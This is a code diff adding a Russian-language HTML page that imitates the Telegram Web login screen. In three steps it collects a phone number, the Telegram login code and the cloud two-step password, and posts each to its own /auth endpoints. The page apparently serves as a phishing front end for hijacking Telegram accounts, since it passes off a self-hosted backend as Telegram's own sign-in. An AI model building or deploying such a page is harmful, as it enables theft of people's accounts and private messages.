@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #18222d;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .auth-container {
+            width: 100%;
+            max-width: 400px;
+            background: #1e2a38;
+            border-radius: 15px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .logo {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .subtitle {
+            text-align: center;
+            color: #8a8a8a;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8a8a8a;
+            font-size: 14px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: #2b3b4d;
+            border: 1px solid #3d5368;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #0077bb;
+        }
+        .btn:disabled {
+            background: #2b3b4d;
+            cursor: not-allowed;
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        .alert {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .alert.success {
+            background: #1a3a2e;
+            color: #4ade80;
+            border: 1px solid #2d5c47;
+        }
+        .alert.error {
+            background: #3a2a2a;
+            color: #f87171;
+            border: 1px solid #5c3d3d;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo">✈️</div>
+        <h1 class="title">Telegram Web</h1>
+        <p class="subtitle">Войдите в свой аккаунт Telegram</p>
+        
+        <!-- Шаг 1: Телефон -->
+        <div id="stepPhone" class="step active">
+            <div class="input-group">
+                <label class="input-label">Номер телефона</label>
+                <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
+            </div>
+            <button class="btn" onclick="startAuth()" id="phoneBtn">Далее</button>
+        </div>
+        
+        <!-- Шаг 2: Код -->
+        <div id="stepCode" class="step">
+            <div class="alert success" id="codeAlert">
+                Код отправлен на номер <span id="phoneDisplay"></span>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Код из Telegram</label>
+                <input type="text" id="codeInput" class="input-field" placeholder="12345" required>
+            </div>
+            <button class="btn" onclick="submitCode()" id="codeBtn">Войти</button>
+        </div>
+        
+        <!-- Шаг 3: Пароль -->
+        <div id="stepPassword" class="step">
+            <div class="alert success">
+                Введите пароль от облачного хранилища
+            </div>
+            <div class="input-group">
+                <label class="input-label">Пароль</label>
+                <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" required>
+            </div>
+            <button class="btn" onclick="submitPassword()" id="passwordBtn">Продолжить</button>
+        </div>
+        
+        <div id="alertContainer"></div>
+    </div>
+
+    <script>
+        let currentPhone = '';
+        let currentCode = '';
+
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+        }
+
+        function showAlert(message, type = 'success') {
+            const container = document.getElementById('alertContainer');
+            container.innerHTML = `<div class="alert ${type}">${message}</div>`;
+        }
+
+        async function startAuth() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                showAlert('Введите номер телефона', 'error');
+                return;
+            }
+
+            currentPhone = phone;
+            const btn = document.getElementById('phoneBtn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
+
+            try {
+                const response = await fetch('/auth/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone})
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('phoneDisplay').textContent = phone;
+                    showStep('Code');
+                    if (data.debug_code) {
+                        console.log('Демо-код:', data.debug_code);
+                    }
+                } else {
+                    showAlert(data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Далее';
+            }
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            if (!code) {
+                showAlert('Введите код', 'error');
+                return;
+            }
+
+            currentCode = code;
+            const btn = document.getElementById('codeBtn');
+            btn.disabled = true;
+            btn.textContent = 'Вход...';
+
+            try {
+                const response = await fetch('/auth/code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: currentPhone,
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    if (data.next_step === 'password') {
+                        showStep('Password');
+                    } else {
+                        window.location.href = data.redirect || '/success';
+                    }
+                } else {
+                    showAlert(data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Войти';
+            }
+        }
+
+        async function submitPassword() {
+            const password = document.getElementById('passwordInput').value;
+            if (!password) {
+                showAlert('Введите пароль', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('passwordBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {
+                const response = await fetch('/auth/password', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: currentPhone,
+                        code: currentCode,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    window.location.href = data.redirect || '/success';
+                } else {
+                    showAlert(data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Ошибка сети', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Продолжить';
+            }
+        }
+
+        // Обработчики Enter
+        document.getElementById('phoneInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') startAuth();
+        });
+        document.getElementById('codeInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') submitCode();
+        });
+        document.getElementById('passwordInput').addEventListener('keypress', e => {
+            if (e.key === 'Enter') submitPassword();
+        });
+    </script>
+</body>
+</html>
